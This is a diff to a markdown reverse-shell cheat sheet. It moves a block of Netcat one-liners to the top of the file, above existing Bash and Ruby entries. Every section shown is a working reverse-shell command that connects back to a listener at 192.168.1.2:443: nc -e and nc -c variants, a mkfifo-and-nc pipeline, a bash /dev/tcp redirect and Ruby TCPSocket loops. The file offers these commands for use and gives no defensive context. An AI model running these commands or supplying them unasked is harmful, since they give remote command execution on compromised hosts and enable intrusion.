@@ -1,5 +1,25 @@
 # Reverse Shell (Netcat Listener)
 
+### Netcat :
+```
+nc -e /bin/sh 192.168.1.2 443
+```
+
+### or
+```
+nc -e /bin/bash 192.168.1.2 443
+```
+
+### or
+```
+nc -c bash 192.168.1.2 443
+```
+
+### or
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+```
+
 ### Bash :
 ```
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
@@ -48,26 +68,6 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.2","443");while(cmd=c.
 ### or
 ```
 ruby -rsocket -e 'c=TCPSocket.new("192.168.1.2","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-```
-
-### Netcat :
-```
-nc -e /bin/sh 192.168.1.2 443
-```
-
-### or
-```
-nc -e /bin/bash 192.168.1.2 443
-```
-
-### or
-```
-nc -c bash 192.168.1.2 443
-```
-
-### or
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
 ```
 
 ### Java :
